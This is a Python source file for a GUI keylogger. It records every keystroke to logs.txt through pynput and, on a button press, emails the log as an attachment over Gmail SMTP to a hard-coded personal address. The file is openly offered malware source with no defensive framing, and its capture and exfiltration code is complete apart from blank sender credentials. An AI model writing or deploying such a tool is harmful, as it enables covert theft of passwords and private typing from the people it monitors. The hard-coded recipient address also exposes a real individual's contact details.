import tkinter as tk
from tkinter import *

from pynput.keyboard import Listener

root = tk.Tk()
root.title('Python Keylogger')
root.geometry('500x500')
root.iconbitmap(r'favicon.ico')
keyLabel = Label(root, text='Key Logger', bg='#ff9514', fg='#fff', font=('blanka', 50), width=50).pack()

canvas = Canvas()
canvas.create_rectangle(20, 60, 480, 395, outline="#ff9514", fill="#ff9514")
canvas.pack(fill=BOTH, expand=1)
img = PhotoImage(file="bullet.png")
img = img.zoom(1)
img = img.subsample(35)

imgLabel = Label(root, image=img).place(x=30, y=200)
l = Label(root, text='Keyboard Tracking', font=('Perpetua Titling MT', 12), fg='#fff', bg='#ff9514').place(x=70, y=198)

imgLabel1 = Label(root, image=img).place(x=30, y=235)
l1 = Label(root, text='Send Logs to Admin via E-mail', font=('Perpetua Titling MT', 12), fg='#fff', bg='#ff9514').place(x=70, y=233)

# imgLabel2 = Label(root, image=img).place(x=30, y=270)
# l2 = Label(root, text='Send Logs to Admin via E-mail', font=('Perpetua Titling MT', 12), fg='#fff', bg='#ff9514').place(x=70, y=268)

# imgLabel3 = Label(root, image = img).place(x=30, y=305)
# l3 = Label(root, text='Send Logs to Admin via E-mail', font=('Perpetua Titling MT', 12), fg='#fff', bg='#ff9514').place(x=70, y=303)

# imgLabel4 = Label(root, image = img).place(x=30, y=340)


lbl = Label(root, text='MY FEATURES', font=('Perpetua Titling MT', 12, 'bold'), fg='#fff', bg='#ff9514').place(x=185,
                                                                                                               y=155)



def keyLog():


    def writeToFile(key):


        letter = str(key)
        letter = letter.replace("'", "")

        if letter == 'Key.space':
            letter = ' '
        if letter == 'Key.alt_l':
            letter = ''
        if letter == 'Key.alt_r':
            letter = ''
        if letter == 'Key.tab':
            letter = ''
        if letter == 'Key.backspace':
            letter = ''
        if letter == 'Key.enter':
            letter = "\n"

        if letter == 'Key.esc':

            exit(1)
        # if letter == 'Key.shift':
        # letter = '"_*"'
        # letter = letter.replace()

        with open('logs.txt', 'a') as f:
            f.write(letter)





    with Listener(on_press=writeToFile) as listen:
        listen.join()

    f = open('logs.txt', 'a')
    f.write('\n\n\n\n')
    f.close()




def Email():
    import smtplib
    from email.message import EmailMessage

    senderEmail = ''
    senderPassword = ''
    reciverEmail = 'aashish99friend@gmail.com'

    msg = EmailMessage()
    msg['Subject'] = 'Test Scrip Python'
    msg['From'] = senderEmail
    msg['To'] = reciverEmail
    msg.set_content('Helloooooo Worldddddd')

    files = ['logs.txt']

    for file in files:
        with open(file, 'rb') as f:
            file_data = f.read()
            file_name = f.name

    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(senderEmail, senderPassword)

        smtp.send_message(msg)



startScript = Button(root, text="Start Script", bg='#ff9514', fg='white', width=10,
                     font=('Perpetua Titling MT', 12, 'bold'), command=keyLog).place(x=20, y=105)
sendEmail = Button(root, text="SEND LOGS", fg='#ff9514', bg='white', width=10,
                   font=('Perpetua Titling MT', 12, 'bold'), command=Email).place(x=340, y=435)

root.mainloop()
